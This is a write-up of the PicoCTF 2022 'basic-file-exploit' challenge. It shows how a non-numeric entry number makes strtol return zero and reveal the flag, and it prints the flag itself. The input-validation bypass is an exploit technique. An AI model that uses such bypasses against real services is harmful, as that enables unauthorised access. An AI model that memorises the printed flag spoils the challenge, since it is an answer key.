Title:  PicoCTF 2022:  basic-file-exploit
Date: 2022-04-05 12:00
Category: PicoCTF
tags: CTF, picoCTF, write-up, binexp
summary: >
	Write up of the basic-file-exploit Binexp Challenge
	
	
# Overview

Simple File was a 100 point challenge in PicoCTF.

Nice easy (although not quite as easy as the first overflow ;)), warmup challenge,
that gets you thinking around how data is processed.


## First look at the Code

Looking at the supplied source file we see the program lets us:

   - Store note at a user supplied index
   - Retrieve a note at  user supplied index.


Both of these functions rely on a special ```t_getinput()``` function that "guards" against us doing 
anything dodgy.

## Running the Binary

We can also run the binary to check for "Interesting" behaviour

```
dang@danglaptop ~/Github/Pico2022/BinExp/BasicFile$ ./a.out                       ✚ ✭main 
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
```

Playing with the inputs (without doing anything special) doesn't appear to break anything

## Understanding the Code

The interesting part of the code is here.

If we can set the entry number to 0,  then the system will give us a flag.

```
  r = tgetinput(entry, 4);

  ....

  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }
```

However, its guarded against an actual input of "0" here: 


```
int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;
    
    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }
```

## Proof Of Concept

I have seen something similar to this on IO, the atoi / strtoi
functions, have "undefined behaviour" if a value they cant pass is
added. If we don't supply a number they return zero.

So Our POC: 

  - Add an Item to the "Database"  (It needs an entry before it lets us retrieve anything)
  - Ask to Retrieve item A
  - ...
  - Profit


## Output

First Connect to the Server

```
$ nc saturn.picoctf.net 53641      ✭main 
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
```


Add out initial Data:

```
1
1
Please enter your data:
foo
foo
Please enter the length of your data:
3
3
Your entry number is: 1
Write successful, would you like to do anything else?
```

Now just read a non digit:

```
2
2
Please enter the entry number of your data:
A
A
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_C5BC1889}
(env) dang@danglaptop ~/Github/Pico2022/BasicFile$ 
```




